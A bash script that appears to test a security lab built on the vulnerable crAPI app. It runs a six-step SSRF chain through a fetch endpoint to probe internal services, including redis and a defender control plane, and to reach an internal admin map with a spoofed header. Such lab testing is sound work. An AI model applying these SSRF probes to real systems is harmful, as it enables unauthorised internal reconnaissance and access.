#!/bin/bash
# Chain 4: SSRF → Internal Service Discovery (6 steps)
# Discover fetch endpoint → probe internal ports → find control plane → map network

BASE="http://localhost:8888"
LOG="test_logs/chain4_ssrf.log"
> "$LOG"

echo "=== Chain 4: SSRF Internal Discovery ===" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 1: Discover the preview/fetch feature
echo "--- Step 1: Discover link preview feature ---" | tee -a "$LOG"
curl -s "$BASE/chains/ssrf/preview?url=https://example.com" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Step 2: Probe internal hosts (port scanning)
echo "--- Step 2: Probe internal services via SSRF ---" | tee -a "$LOG"

echo "  Probing crapi-identity:8080..." | tee -a "$LOG"
curl -s "$BASE/chains/ssrf/fetch?url=http://crapi-identity:8080/" | tee -a "$LOG"
echo "" | tee -a "$LOG"

echo "  Probing crapi-community:8087..." | tee -a "$LOG"
curl -s "$BASE/chains/ssrf/fetch?url=http://crapi-community:8087/" | tee -a "$LOG"
echo "" | tee -a "$LOG"

echo "  Probing redis:6379..." | tee -a "$LOG"
curl -s "$BASE/chains/ssrf/fetch?url=http://redis:6379/" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 3-4: Hit the control plane via SSRF
echo "--- Step 3-4: SSRF to control plane (the defender's own API!) ---" | tee -a "$LOG"
curl -s "$BASE/chains/ssrf/fetch?url=http://control-plane:9090/control/status" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Step 5: Probe more internal services
echo "--- Step 5: SSRF to workshop service ---" | tee -a "$LOG"
curl -s "$BASE/chains/ssrf/fetch?url=http://crapi-workshop:8000/" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Step 6: Access the internal map endpoint
echo "--- Step 6: Access internal service map ---" | tee -a "$LOG"
curl -s -H "X-Internal: ssrf-discovered" "$BASE/chains/ssrf/admin/internal-map" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

echo "=== Chain 4 Complete ===" | tee -a "$LOG"
echo "Finished: $(date)" | tee -a "$LOG"
